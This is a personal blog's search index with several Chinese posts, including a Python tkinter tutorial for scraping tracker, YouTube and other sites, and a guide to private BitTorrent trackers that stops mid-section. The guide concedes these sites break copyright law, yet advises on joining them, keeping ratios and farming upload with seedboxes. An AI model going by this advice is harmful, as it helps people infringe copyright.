<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Document</title>
    <url>/2020/04/13/%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="b8a174accac07b2dc4da1ec62df477fa765c439229af03eac7cb3161090139b8">d4155f2e349f5b8b303096873299bda773403a64633777072c814daa5f003710b4049879705ecbb80da5638a53f66d0402d6df2cf37606f2b4d3e00ae739cf2904b44a28abeb7ead1631c847aa973cdff19d115f13947f300e482dfde421fb2684781d4d42a9b67fb222f5ca7c476f71b9ca9f0c59663a7757185117bbdc2ee330453e4de74a328a6f637fb3046b4c9cca3945ce0e589a26d1c69bf89bde94ce1348d4c3288c8d9107ba5abdeeb7e101579e7a0d614390e0229dae1f1f94b835214126e2b12bd8fb80d1fbd6fa73ad482b5f3a80daa10d14bb748cd1fdd03fd585cce872df3e5b733be43642e42197d6b4cd63e67a49ba64a6692fe79f2e2dbcae5692ffb08fe18ffa558eae66cb3380a582c31469fb6fff2337b879d77ae56f19c9acf22f27902710e9c1bc58316589c636cf08faef1972d7dfa3cd2191058f0691d264c14cf30d58f4eb9c9fe615f3c6c787961b2c097d72f614053273217f2b316dafb77b84b9a47e5c5e56187e389b20710e2328c49398a097d3b7d1b58d6cc39331ee70efa89167b97e69f125cc4dc1e0910cd6917b667ae909c0587ff7da50e4249bec5e698fb635057ba402f3a5849ce02b2f229872f12ecdd37c90bc82e600357bf20fc1de2f02dcb088d0f696fd9ca18c29964dca4e1834342a7483bd091116b9f628c3cc3a7e0750f9aba78a3cb8727685705aed6d4f49f67f36158c7a0e9cebda8f99d83fca168888943258e9e9c2bca1798b850acab714d3a4e4288c4a11c04443c1d9c0e21e694e880da792b7458624e921567c6ed3c56773669673c65487e8b09aaeb156be61e19038359fc0068a006f9d6ed4c3071630b5971fff7b4382f5b4cf4a24d0c83ace8ac7de48ba02a97f46be16376af9219bb8405aa293192a80541caa06adcd5905981924d2719a1dfbaab7733f199191c417f0d0f0a4378f80cf68bdc57d5c7ef2189e1bbd537c59b87fea1029573e8f6179dbea357eb84d817f4c0258c6beea126b3d0887045aa84f1a51dac5c4726ca83d38700fb37616fd03992a9d15bae964917c19a6933ac124e34e94047cb2b06f58bfd17f0d690408525cf3bb5662ac4de88555277470b199ef1f4a167f253f84e0364c984b971e95325157d302187e9007ed</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>大数据实时主流信息查询</title>
    <url>/2022/06/17/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E4%B8%BB%E6%B5%81%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<h4 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode-cn.com/problems/two-sum/">1. 两数之和</a></h4><a id="more"></a>




<h2 id="大数据实时主流信息查询"><a href="#大数据实时主流信息查询" class="headerlink" title="大数据实时主流信息查询"></a>大数据实时主流信息查询</h2><blockquote>
<p>为解决大数据实时主流信息查询的需求，采用python技术，设计了实时主流信息程序，获得了满意的结果，程序经测试，符合预期需求，为构建一种可以灵活扩展的应用程序提供解决思路或借鉴。</p>
</blockquote>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="3"><a href="#3" class="headerlink" title="3. "></a><strong>3.</strong> <img src="https://img-blog.csdnimg.cn/img_convert/1284aae8413e5d8bc9d3d37ebaa2d02a.png" alt="img"></h2><h4 id="程序设计："><a href="#程序设计：" class="headerlink" title="\程序设计：**"></a><strong><em>\</em>程序设计：**</strong></h4><p><img src="https://img-blog.csdnimg.cn/img_convert/38cd778f16486ab60d00408d3f4c3588.png" alt="img"> </p>
<pre class="line-numbers language-none"><code class="language-none">

cmd &#x3D; &#39;your command&#39;

res &#x3D; subprocess.call(cmd, shell&#x3D;True, stdin&#x3D;subprocess.PIPE, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE)

用于隐藏cmd命令窗口

打包时需要pyinstaller --onefile --icon&#x3D;favicon.ico  test.py -w

普通的pyinstaller -F -i favicon.ico test.py

无法隐藏cmd命令窗口

window &#x3D; tk.Tk()

创建gui

window.title(&quot;LHL&#39;s Information&quot;)

window.iconbitmap(&#39;favicon.ico&#39;)

window.geometry(&quot;1500x1000&quot;)

设置窗口名称，图标，大小
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/img_convert/d1e5ec4029d20074b6d70284c9816f42.png" alt="img"> </p>
<pre class="line-numbers language-none"><code class="language-none">这两个为全局变量

Flag表示现在的线程 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/img_convert/44a41a4facd03c2b0c5326a5f2799b5d.png" alt="img"> </p>
<pre class="line-numbers language-none"><code class="language-none">用于控制临界资源，不抢占text输出窗口

delay_time

为time.sleep的时间，单位秒

定义定义线程刷新时间间隔<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://img-blog.csdnimg.cn/img_convert/dd8823e40c48548511cb364f27cb2748.png" alt="img"></h4><h4 id="-3"><a href="#-3" class="headerlink" title=""></a></h4><h4 id="Flag一定要用全局，不然无法起到控制临界资源的作用"><a href="#Flag一定要用全局，不然无法起到控制临界资源的作用" class="headerlink" title="\Flag一定要用全局，不然无法起到控制临界资源的作用**"></a><strong><em>\</em>Flag一定要用全局，不然无法起到控制临界资源的作用**</strong></h4><pre class="line-numbers language-none"><code class="language-none">HTTP是“Hypertext Transfer Protocol”的所写，整个万维网都在使用这种协议，几乎你在浏览器里看到的大部分内容都是通过

http协议来传输的.

HTTP Headers是HTTP请求和相应的核心，它承载了关于客户端浏览器，请求页面，服务器等相关的信息。

&#39;user-agent&#39;:

User-Agent会告诉网站服务器，访问者是通过什么工具来请求的，如果是爬虫请求，一般会拒绝，如果是用户浏览器，就会应答。

&#39;cookie&#39;：

Cookie是保存在客户端的纯文本文件。比如txt文件。所谓的客户端就是我们自己的本地电脑。当我们使用自己的电脑通

过浏览器进行访问网页的时候，服务器就会生成一个证书并返回给我的浏览器并写入我们的本地电脑。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

































 <pre class="line-numbers language-none"><code class="language-none">
t &#x3D; tk.Text(window, width&#x3D;3840, height&#x3D;2160, font&#x3D;(&#39;Consolas&#39;, 15))   

创建一个文本框输出输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="-4"><a href="#-4" class="headerlink" title=""></a></h4><p><img src="https://img-blog.csdnimg.cn/img_convert/7a12efe19cff9351237f7c43fc287f29.png" alt="img"> </p>
<pre class="line-numbers language-none"><code class="language-none">t.delete(1.0, &#39;end&#39;) 为删除之前显示的内容

t.insert(&#39;end&#39;, &quot;          hd_ai&quot; + &#39;\n&#39; + &#39;\n&#39;)

插入标题

JSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式

url &#x3D; &#39;https:&#x2F;&#x2F;www.hd.ai&#x2F;Torrents.tableList&#39;
	source &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).json()

请求json数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/eaf7a70c4c37b7058739623cff0d2070.png" alt="img"> </p>
<pre class="line-numbers language-none"><code class="language-none">#### card_list &#x3D; source[&#39;data&#39;][&#39;items&#39;]

#### 定位到每个词条

Card_list中包含所有的词条，是一个集合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bb66b188c1a8bf074b904ed2b73af201.png" alt="img"> </p>
<pre class="line-numbers language-none"><code class="language-none">之后遍历card_list下的&#39;small_descr&#39;和&#39;details&#39; 得到标题和网址

之后通过t.insert 输出到tk.Text
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>






<p>除了上面json按层级展开，还有xpath寻找和正则表达式寻找</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/003affea3d7387d0a627da43d8521592.png" alt="img"> </p>
<pre class="line-numbers language-none"><code class="language-none">titles &#x3D; tree.xpath(&#39;&#x2F;&#x2F;*[@id&#x3D;&quot;sanRoot&quot;]&#x2F;main&#x2F;div[2]&#x2F;div&#x2F;div[2]&#x2F;div&#39;)

为匹配到所用的div词条<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6d1589c98938421f4df6d29c7efe84cd.png" alt="img"> </p>
<pre class="line-numbers language-none"><code class="language-none">for i in titles:

再进行逐个遍历输出词条<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<p><img src="https://img-blog.csdnimg.cn/img_convert/3e8f71d99a3e629a7f5339917e192774.png" alt="img">```</p>
<pre class="line-numbers language-none"><code class="language-none">再输出想要的数据到tk.text后



操作菜单&#39;,    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cc6217a7b97cbe37064ea66df65046aa.png" alt="img"></p>
<p>Youtube 的结构比较复杂，需要用到正则匹配</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/380802b0ee7f6615148092696996185c.png" alt="img"> </p>
 <pre class="line-numbers language-none"><code class="language-none">
youtube_json &#x3D; re.compile(&#39;responseContext&quot;.*?&quot;serviceTrackingParams(.*?)function serverContract()&#39;, re.S)

(.*?)为需要的内容  .*?为可以变动的内容  其他为固定内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">因为内容太多，匹配需要很长时间，先进行一次筛选，只留下包含信息的内容

再进行第二次筛选<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">youtube_title&#x3D; &#x3D; re.compile(&#39;,&quot;title&quot;:&#123;&quot;runs&quot;:.&#123;&quot;text&quot;:&quot;(.*?)&quot;&#125;.,.*?publishedTimeText&quot;:&#123;&quot;simpleText&quot;:&quot;(.*?)&quot;&#125;,.*?accessibilityData&quot;:&#123;&quot;label&quot;:&quot;(.*?)&quot;&#125;&#125;,.*?viewCountText&quot;:&#123;&quot;simpleText&quot;:&quot;(.*?)&quot;&#125;,&quot;navigationEndpoint.*?webCommandMetadata.*?url&quot;:&quot;(.*?)&quot;.*?ownerText.*?text&quot;:&quot;(.*?)&quot;,&quot;navigationEndpoint.*?操作菜单&#39;,re.S)     

 

names &#x3D; re.findall(youtube_title, json_get)

用youtube_title规则对 json_get 进行筛选

得到 6 条有用信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cba667aa8aa18f11a6e06056539ee1f3.png" alt="img"> </p>
 <pre class="line-numbers language-none"><code class="language-none">
再进行输出，得到结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>




<p><img src="https://img-blog.csdnimg.cn/img_convert/325da7232a22e476301d331875d5507c.png" alt="img"> </p>
<pre class="line-numbers language-none"><code class="language-none">threadName, delay 是用于多线程的名字和延迟，但我的延迟不由此决定，而是由time.sleep(delay_time)决定

Delay_time是一个全局变量，方便全局控制，无需逐个调试<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<p><img src="https://img-blog.csdnimg.cn/img_convert/9c09262064243cd15e1fb091a502e834.png" alt="img"> </p>
<pre class="line-numbers language-none"><code class="language-none">每个功能都用一个线程调用

 

flag &#x3D; &#39;hd_ai&#39;

  while flag &#x3D;&#x3D; &#39;hd_ai&#39;:

上面的flag用于控制临界资源，就是Tk.text

如果多个线程调用text，则他们抢占text，无法看清内容

如果不用多线程的话，就会出现

如果网页请求超时或无法请求或网页格式改变，程序就会卡死，无响应<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="-5"><a href="#-5" class="headerlink" title=""></a></h4><h4 id="程序-运行界面"><a href="#程序-运行界面" class="headerlink" title="\程序******运行界面****"></a><strong><em>\</em>程序*****</strong>*运行界面****</h4><table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td><img src="https://img-blog.csdnimg.cn/img_convert/2ae375f1766c975515961ac3c3f4139f.png" alt="img"></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
</table>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b9e790446001bdd2ed4f9094c6fc7f2c.png" alt="img"> </p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/20cd1ce721d3f974a7786c12873d1ba0.png" alt="img"> </p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8cb12bca11f1b2edc20c35e9194e09ac.png" alt="img"> </p>
<h2 id="-6"><a href="#-6" class="headerlink" title=""></a></h2><h2 id="结论与感想"><a href="#结论与感想" class="headerlink" title="结论与感想"></a>结论与感想</h2><pre class="line-numbers language-none"><code class="language-none">大数据技术用了多年时间进行演化，才从一种看起来很炫酷的新技术变成了企业在生产经营中实际部署的服务。其中，数据采集产品迎来了广阔的市场前景，无论国内外，市面上都出现了许多技术不一、良莠不齐的采集软件。一款简单易用的网页信息抓取软件,能够抓取网页文字、图表、超链接等多种网页元素。同样可通过简单可视化流程进行采集，服务于任何对数据有采集需求的人群。

一个简单，简洁的信息搜集软件对我生活的改变是巨大的，不用花大量的时间在互联网上寻找新闻与信息，只需要简单的浏览，便可以知道绝大多数想了解的信息，从而提高效率，获得更多的信息。

软件往往无需过度的修饰，斯是陋室，惟实用，为先，简单往往意味着高效。过度的修饰往往破坏获取信息的效率。互联网的信息过于繁杂，往往只需要获取头部的信息，和一些深度分析文章即可。

要主动打破信息茧房，不要让算法左右了我们的人生。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>阈值分割</title>
    <url>/2022/05/01/%E9%98%88%E5%80%BC%E5%88%86%E5%89%B2/</url>
    <content><![CDATA[<blockquote>
<p>迭代求阈值</p>
</blockquote>
<a id="more"></a>


<p><a href="/photo/course.rar">迭代求阈值</a></p>
<blockquote>
<ul>
<li><a href="https://vscode.dev/">https://vscode.dev/</a></li>
<li><a href="https://lhl1.lanzouq.com/i7cQJ04bbwfe">https://lhl1.lanzouq.com/i7cQJ04bbwfe</a></li>
<li><a href="http://lhl1.ysepan.com/">http://lhl1.ysepan.com/</a></li>
</ul>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>部分pt豆瓣Top250:1-10</title>
    <url>/2022/04/02/top%E8%B1%86%E7%93%A31-10/</url>
    <content><![CDATA[<p>​                                                                       <strong>部分pt豆瓣Top250</strong>:  1-10</p>
<h6 id=""><a href="#" class="headerlink" title=""></a><img src="https://s2.loli.net/2022/04/01/q7GjuKnCEyp9wWc.png" alt="image-20220401234429206"></h6><p><img src="https://s2.loli.net/2022/04/01/XfTxY4QVMRg3Ekl.png" alt="image-20220401234413478"></p>
<p><img src="https://s2.loli.net/2022/04/01/ho9ZjrwU7eJdTKx.png"></p>
<p><img src="https://s2.loli.net/2022/04/01/iNoOhceknLFDAbV.png"></p>
<p><img src="https://s2.loli.net/2022/04/01/kvlFZqznM48VyYI.png" alt="image-20220401234705470"></p>
<p><img src="https://s2.loli.net/2022/04/01/8FAsYbdJLN26gKT.png" alt="image-20220401234734728"></p>
<p><img src="https://s2.loli.net/2022/04/01/FlrWkhUGbJvnQug.png" alt="image-20220401234928168"></p>
<p><img src="https://s2.loli.net/2022/04/01/HhrsTqko3upDmvV.png" alt="image-20220401234949016"></p>
<p><img src="https://s2.loli.net/2022/04/01/mK1HhQJAi5IOc2Z.png" alt="image-20220401235113894"></p>
<p><img src="https://s2.loli.net/2022/04/01/s1xtnLh7yZHFQiU.png" alt="image-20220401235143470"></p>
<p><img src="https://s2.loli.net/2022/04/01/INjZW1dSoaVe4bc.png" alt="image-20220401235227203"></p>
<p><img src="https://s2.loli.net/2022/04/01/5mdlaWXiZ1jtvDV.png" alt="image-20220401235246541"></p>
<p><img src="https://s2.loli.net/2022/04/01/q9UVl8m3QBpZFdD.png" alt="image-20220401235327336"></p>
<p><img src="https://s2.loli.net/2022/04/01/D2cQyJifFvStTbx.png" alt="image-20220401235358211"></p>
<p><img src="https://s2.loli.net/2022/04/01/QnZ1fVCxSJKwclR.png" alt="image-20220401235420844"></p>
<p><img src="https://s2.loli.net/2022/04/01/Ga16D7VW5xgdZYF.png" alt="image-20220401235505362"></p>
<p><img src="https://s2.loli.net/2022/04/01/v7tdTWMQeqSOco9.png" alt="image-20220401235524206"></p>
<p><img src="https://s2.loli.net/2022/04/01/CfbOo618GDuxWQq.png" alt="image-20220401235640751"></p>
<p><img src="C:/Users/LHL/AppData/Roaming/Typora/typora-user-images/image-20220401235710583.png" alt="image-20220401235710583"></p>
<p><img src="https://s2.loli.net/2022/04/01/YsEALvBG8m9zUw3.png" alt="image-20220401235740174"></p>
<p><img src="https://s2.loli.net/2022/04/01/ZI5wNKWTYSlrPae.png" alt="image-20220401235921518"></p>
<p><img src="https://s2.loli.net/2022/04/02/L2T1ghMASpec4mK.png" alt="image-20220401235950320"></p>
]]></content>
  </entry>
  <entry>
    <title>PT之路</title>
    <url>/2022/03/19/PT%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<blockquote>
<p>Pter是PT站的基础，PT站是Pter的延伸。</p>
</blockquote>
<a id="more"></a>

<h2 id="引用介绍"><a href="#引用介绍" class="headerlink" title="引用介绍"></a>引用介绍</h2><blockquote>
<p>PT (Private Tracker) 是一种基于私有 BT Tracker 服务器的资源传播形式，经授权的用户使用受允许的客户端进行种子制作与下载。相较于传统 BT 和 emule，PT 站往往采取了严格的邀请制度以及免责制度来规避法律风险，同时要求用户客户端开启传输加密以绕过运营商的检测策略。当然，从实际上来说 PT 站的运营、使用仍然是违背了各国版权法的。</p>
</blockquote>
<blockquote>
<p>许多高清爱好者聚集在 PT 站，发布翻录的蓝光原盘、CD 资源以及录制的高清卫星电视讯号；得益于 Netflix、HBO、Apple TV 等高清流媒体在线视频平台的发展，近年也出现了一些 WEB-DL (Download from Web) 资源。</p>
</blockquote>
<h2 id="目前国内使用的-PT-站源码大部分为基于浙江大学-xiazuojie-团队所开发的开源整站项目-NexusPHP，基于-PHP-MySQL-memcached。部分站点使用-Discuz-进行二次开发。"><a href="#目前国内使用的-PT-站源码大部分为基于浙江大学-xiazuojie-团队所开发的开源整站项目-NexusPHP，基于-PHP-MySQL-memcached。部分站点使用-Discuz-进行二次开发。" class="headerlink" title="目前国内使用的 PT 站源码大部分为基于浙江大学 xiazuojie 团队所开发的开源整站项目 NexusPHP，基于 PHP + MySQL + memcached。部分站点使用 Discuz! 进行二次开发。"></a>目前国内使用的 PT 站源码大部分为基于浙江大学 xiazuojie 团队所开发的开源整站项目 NexusPHP，基于 PHP + MySQL + memcached。部分站点使用 Discuz! 进行二次开发。</h2><blockquote>
<p>日前，@burpheart 基于上游项目，开发了新版的 NexuxPHP Safe。其修复了一些已知的安全漏洞，并加入了一些增强用户体验的小功能。</p>
</blockquote>
<blockquote>
<p>2022 年更新：@burpheart 似乎逐步淡出了项目维护。目前项目迁移至 xiaomlove/nexusphp，由 @xiaomlove 为主的开发者继续维护。</p>
</blockquote>
<h2 id="国内-PT-站可以划分为两个系别：教育网-PT-站-与-公网-PT-站。"><a href="#国内-PT-站可以划分为两个系别：教育网-PT-站-与-公网-PT-站。" class="headerlink" title="国内 PT 站可以划分为两个系别：教育网 PT 站 与 公网 PT 站。"></a>国内 PT 站可以划分为两个系别：教育网 PT 站 与 公网 PT 站。</h2><h2 id="教育网-PT-站点"><a href="#教育网-PT-站点" class="headerlink" title="教育网 PT 站点"></a>教育网 PT 站点</h2><blockquote>
<p>以北邮人（北京邮电大学）、蒲公英（西北工业大学）、极速之星（北京理工大学）和六维空间（东北大学）为主。</p>
</blockquote>
<blockquote>
<p>高校校园网提供的 IPv4 网络一般是有计费及限速策略的，由校方向电信、联通、移动、鹏博士等运营商采购带宽并在出口实施自动分流。而为了推广 IPv6 业务，各高校所接入的中国教育网（CERNET）的 IPv6 网络一般是不计费且不限速的，因此组建一个依托于 IPv6 的免费资源分享网络有着很大意义。</p>
</blockquote>
<blockquote>
<p>一般来说，教育网 PT 站的原创影视资源较少，大部分为转载资源。Coursera、Udacity 等公开课资源（WEB-DL）、考研视频、电子书等内容较多，此外，北邮人等站点还提供一些诸如 Steam 游戏数据备份文件，这样学生就不用担心被几十个 G 的 Steam 游戏更新榨干网费了。</p>
</blockquote>
<blockquote>
<p>目前来看教育网 PT 站或多或少获得了学校网络中心的技术和政策支持，所以才能存留至今。部分教育网 PT 站仅允许 IPv6 或仅归属于教育网 ASN 的 IPv6 访问，因此对于公众来说访问有些难度，可以通过 HE.net 提供的 IPv6 TunnelBroker 隧道，或者 IPv6 VPS 来中转流量。</p>
</blockquote>
<blockquote>
<p>从分享率和发种规范来看，教育网 PT 十分宽松，但保种率可能不如公网 PT 站高，资源也没那么丰富。但对于追热门电影和美剧的轻度用户来说还是足够了。</p>
</blockquote>
<h2 id="公网-PT-站点"><a href="#公网-PT-站点" class="headerlink" title="公网 PT 站点"></a>公网 PT 站点</h2><blockquote>
<p>传说中国有五大公网 PT 站：HDS、TTG、HDC、CHD、HDR，也有三大 PT 站的说法（即 CHDbits、HDChina、TTG）。后来经过世界版权日风波（即被称作“中国版权第一案”的思路网侵权案），HDStar（思路网）管理组被捕入狱，剩下的站点也多多少少受到了一些影响，有些直接关闭了，有的则隐没了。</p>
</blockquote>
<blockquote>
<p>希望考古中国 PT 站历史的朋友可以查看这个帖子：国内外PT站点评。希望考古国际 PT 站的朋友，可以查看这个帖子：PT站点大全。历史比较悠久了，仅供参考。</p>
</blockquote>
<blockquote>
<p>距离版权日风波已经过去了七八年，现在国内 PT 站又呈现出繁荣景象。一方面国内电视剧集的分级制度迟迟未推出，而 Netflix、HBO、Disney+、Apple TV+ 等境外流媒体业务的订阅费用也居高不下。另一方面，国内百兆、千兆家庭宽带已经覆盖到了三四线城市甚至是县城，养一个 PT 账号的成本已经相当低了。</p>
</blockquote>
<h2 id="目前以影视资源为主的有"><a href="#目前以影视资源为主的有" class="headerlink" title="目前以影视资源为主的有"></a>目前以影视资源为主的有</h2><blockquote>
<p>HDChina 瓷器：近 10 年的老站，用户数据继承自原先的 HDWinG 和 HDStar。资源方面，官方制作组（HDCTV 和 HDChina）的 Netflix、HBO 剧集，原盘，录制的电视剧比较多。<br>CHDbits 彩虹岛：近 10 年的老站点，影视资源很丰富。<br>SSD (Spring Sunday)：2010 年创建的老站点，前身为 CMCT 触摸春天。<br>M-Team 馒头：有比较多的成人内容，官方提供付费邀请码购买渠道。<br>BT School 比特校园：2019 年刚创建的新站点，门槛相对比较低。<br>HD Time 高清时间：老站点，但是没什么名气。<br>52PT 我爱PT：新站点。<br>HDSky 天空：综合站点。<br>TTG：国内大站之一，2014 年末作为 TTG 出现。<br>Ourbits 我堡：算是国内大站了，没啥特色。<br>HDHome 家园：2015 年左右成立的 PT 站，没啥特色。<br>PTHome 铂金家：2018 年左右成立的新站，没啥特色。<br>HDCity 城市：2016 年底成立的新站（相对来说）。<br>NicePT 老师站：又成为小馒头（相对于 M-Team 来说），主要为成人内容。<br>CCFBits 精品高清：挺老的大站了，资源很丰富也很低调。<br>HDR (HDRoute)：前身为 HDRoad 思路高清，历史悠久。<br>LeagueHD 柠檬：小站中发展的还算不错的，2019 年成立。<br>Haidan 海胆之家：2020 年刚成立的小站。<br>教育网 PT，部分 tracker 可能仅允许教育网或 IPv6 连接。入站门槛较低，可以凭借 edu 教育域名的邮箱进行注册，也可以通过校内用户发起邀请。对分享率和种子规范的限制比较宽松。</p>
</blockquote>
<blockquote>
<p>NanyangPT 南洋：西安交通大学 PT 站<br>BYR 北邮人：北京邮电大学 PT 站，仅对 IPv6 开放<br>TJUPT 北洋园：天津大学 PT 站<br>葡萄PT：上海交通大学 PT 站<br>NPUPT 蒲公英：西北工业大学 PT 站<br>BITPT 极速之星：北京理工大学 PT 站<br>六维空间：东北大学 PT 站<br>NexusHD：浙江大学 PT 站，仅供校内用户访问。<br>以动漫资源为主的有</p>
</blockquote>
<blockquote>
<p>U2 动漫花园 幼儿园：老牌动漫 PT 站。各种上古资源都能找到。<br>Skyey Snow 天雪动漫：基于 Discuz! 构建的 PT 站点，相对来说新一些。<br>以音乐资源为主的有</p>
</blockquote>
<blockquote>
<p>OpenCD 皇后 PT：小体积种子比较多，基本靠攒魔力值来保号。<br>用户规范<br>对于用户，无论是公网 PT 站还是教育网 PT 站，往往都有以下要求：</p>
</blockquote>
<h2 id="上传、下载量："><a href="#上传、下载量：" class="headerlink" title="上传、下载量："></a>上传、下载量：</h2><blockquote>
<p>新手考核计划一般为一个月内 &gt;=50GB 的上传下载量。部分教育网 PT 站可能没有新手考核要求。</p>
</blockquote>
<h2 id="分享率（上传量-下载量）："><a href="#分享率（上传量-下载量）：" class="headerlink" title="分享率（上传量/下载量）："></a>分享率（上传量/下载量）：</h2><blockquote>
<p>PT 站的优质资源离不开各位用户的分享和做种。为了减少吸血鬼用户的影响，几乎所有 PT 站点都会要求用户的风险率超过一定值。除此之外，用户分享率与用户等级相关，如果风险率低于标准会自动回退到较低的用户等级。</p>
</blockquote>
<h2 id="魔力值（Bonus-points，即积分，获得于用户赠送、活动奖励或做种）："><a href="#魔力值（Bonus-points，即积分，获得于用户赠送、活动奖励或做种）：" class="headerlink" title="魔力值（Bonus points，即积分，获得于用户赠送、活动奖励或做种）："></a>魔力值（Bonus points，即积分，获得于用户赠送、活动奖励或做种）：</h2><blockquote>
<p>魔力值可以用于兑换站内头衔、更改用户名、消除广告，甚至至博彩小游戏（例如赌球或 24 点，常见于世界杯期间）。</p>
</blockquote>
<h2 id="最小做种时间："><a href="#最小做种时间：" class="headerlink" title="最小做种时间："></a>最小做种时间：</h2><blockquote>
<p>为了保障种子活跃度，一些 PT 站严格禁止下完就跑（称为 H&amp;R, Hit and Run）的行为，要求用户至少持续做种一定时间）。摘录一段 OpenCD 的规则作为参考。<br>在种子下载完成后，该种子需在 30 天内做种 36 小时，未达到此要求则记一次 H&amp;R。<br>H&amp;R 满 10 次，即 ban。皇后及以上级别，包括 VIP，计算 HR 次数，但不 ban 号。</p>
</blockquote>
<blockquote>
<p>消除已获得的 H&amp;R 的两种方式</p>
</blockquote>
<ol>
<li>获得 H&amp;R 的种子在 90 天内达到 300 小时做种时间则会自动消除该 H&amp;R</li>
<li>用魔力值兑换取消 H&amp;R 次数<br>生存指南<br>考核期<br>大部分站点都有邀请考核制度，需要在一个月时间内达成一定的上传量、下载量以及魔力值。部分站点考核由于不计算魔力值的兑换上传量，建议老老实实下载热门种子并做种。</li>
</ol>
<blockquote>
<p>邀请者可以消耗数倍的魔力值来兑换一个无需新手考核的邀请码。被邀请人也可以付费捐赠（几百元不等）来免除新手考核。</p>
</blockquote>
<blockquote>
<p>考核后<br>对于一些以影视作品为主的网站，尽可能的下载热门种子，这样能更快的获得上传量。可以使用 BT 客户端的 RSS 订阅功能，实现无人值守下载。<br>对于以小种为主的 PT 站，如 OpenCD 以及大部分教育网站点，则需要通过下载大量小体积种子并长时间做种以换取魔力值，再使用魔力值兑换上传。</p>
</blockquote>
<blockquote>
<p>养老期<br>此时混 PT 只为偶尔下几个资源，而不是那么注重参与了，因此保持一个良好的分享率以备不时之需是很有必要的。</p>
</blockquote>
<p>部分站点可以通过捐赠获得终身 VIP 头衔，从此不再需要担心分享率问题。</p>
<blockquote>
<p>刷流量<br>想快速将上传、下载流量刷上去，最快的办法就是租用 Seedbox。Seedbox 即专用于跑 BT/PT 的服务器，一般位于海外（德国、罗马尼亚、荷兰）等地。</p>
</blockquote>
<blockquote>
<p>可以通过 SeedBox 例如 FeralHosting 或 Seedbox.io 配合 RSS 订阅来实现无人值守下载。由于 Seedbox 带宽相对较大（普遍在 1-10Gbps 左右），盒子间互刷效果过于明显，部分 PT 站会有 seedbox 限制政策，例如限制上传、下载速度或者最大上传量。</p>
</blockquote>
<blockquote>
